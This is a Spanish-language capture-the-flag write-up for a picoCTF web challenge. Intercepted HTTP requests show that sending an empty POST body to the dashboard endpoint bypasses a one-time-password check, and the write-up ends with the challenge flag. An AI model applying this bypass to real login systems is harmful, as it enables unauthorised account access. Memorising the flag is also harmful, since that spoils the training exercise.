# Descripcion
Try [here](http://titan.picoctf.net:50156/) to find the flag

## Hints
- Try using burpsuite to intercept request to capture the flag.
- Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.

# Solucion

Lo primero que hacemos es analizar la pagina y lo que esta trantando de hacer. Lo primero que encontramos es un formulario de registro. Esto es interesante por que podemos mandar una peticion, entonces, llenamos los datos, interceptamos y mandamos la peticion de `registro` 

```
POST / HTTP/1.1
Host: titan.picoctf.net:59370
Content-Length: 213
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://titan.picoctf.net:59370
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:59370/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw1jEEOwiAQRe_C2oUFOgWX9iDNQIfUSKGBNqYx3t0h0eW8-e-9hX_sp7iJOxZPMScUF-FrCdOen5T4oZA0AMi5A-O8Cdoqh51CJXsmAayZzbXXjr1wxDglXIm18XRUxoUC87xvTAawcrjyuWGtr1xmZp1Uum9oyYmmdKws_TEMxrb5Uan8ohR9y_qW_XwBmS44Ng.Z-7-5w.THNKr530SNTtrslK_lj4kwWnKjw
Connection: keep-alive

csrf_token=IjNhZTQ2NjYyZDE2OGJjOGY0OTNiYTEzYTMyNTE2OGY2OThkODA1NGIi.Z-8BTA.YDEQ0Yy9AuDM_pMXe35u-4j_q70&full_name=CyberChef&username=elcyberchef&phone_number=1234567890&city=Barcelona&password=12345&submit=Register
```


Aqui destacamos lo que encontramos, veos que esta pagina usa un token de csrf para validar tambien la sesion. 


Una vez que le mandamos los datos nos pide ingresar una `OTP` (One-time-password), Pero, no obtuvimos esta contraseña?? . 

Interceptamos la peticion con burpuiste e intentamos mandar distintos datos.

Intentamos mandando un numero: 

peticion: 
```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:50187
Content-Length: 9
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://titan.picoctf.net:50187
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:50187/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw1jM0OwiAQBt-Fs4e2_Eg92gchCyypkUIDNKYxvrtLosed_WbezD3ayW7sDsVhzAnYhblagmn5iYkeHFAopSY_Km2dDmLmFkYOfJJEgpq114MUlrxwxGgSbEjaclosy4qBeG57D3Ep5EDnDrW-cvHExokL2dGaE5p0bCT9sbrquc-PiuUXxeh61vXs5wuVyzgr.Z-8F7w.brd8mgPeU7RgD1kPLSzXR9OqG6E
Connection: keep-alive

otp=12345

````

response: 
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Thu, 03 Apr 2025 22:05:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 11
Vary: Cookie
Connection: close

Invalid OTP
```

- Probamos con texto:

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:50187
Content-Length: 9
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://titan.picoctf.net:50187
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:50187/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw1jM0OwiAQBt-Fs4e2_Eg92gchCyypkUIDNKYxvrtLosed_WbezD3ayW7sDsVhzAnYhblagmn5iYkeHFAopSY_Km2dDmLmFkYOfJJEgpq114MUlrxwxGgSbEjaclosy4qBeG57D3Ep5EDnDrW-cvHExokL2dGaE5p0bCT9sbrquc-PiuUXxeh61vXs5wuVyzgr.Z-8F7w.brd8mgPeU7RgD1kPLSzXR9OqG6E
Connection: keep-alive

otp=aaaaa
```

response:
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Thu, 03 Apr 2025 22:06:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 11
Vary: Cookie
Connection: close

Invalid OTP
```

Vemos que hay una respuesta de error para casos cuando el numero que se manda no coinicide, y verifica que la entrada del dato es numerico. ¿Que sucede si le mandamos un null?

Peticion
```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:50187
Content-Length: 0
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://titan.picoctf.net:50187
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:50187/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw1jM0OwiAQBt-Fs4e2_Eg92gchCyypkUIDNKYxvrtLosed_WbezD3ayW7sDsVhzAnYhblagmn5iYkeHFAopSY_Km2dDmLmFkYOfJJEgpq114MUlrxwxGgSbEjaclosy4qBeG57D3Ep5EDnDrW-cvHExokL2dGaE5p0bCT9sbrquc-PiuUXxeh61vXs5wuVyzgr.Z-8F7w.brd8mgPeU7RgD1kPLSzXR9OqG6E
Connection: keep-alive

```

Response:
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Date: Thu, 03 Apr 2025 22:08:17 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 112
Vary: Cookie
Connection: close

Welcome, elcyberchef you sucessfully bypassed the OTP request. 
Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```


## Referencias
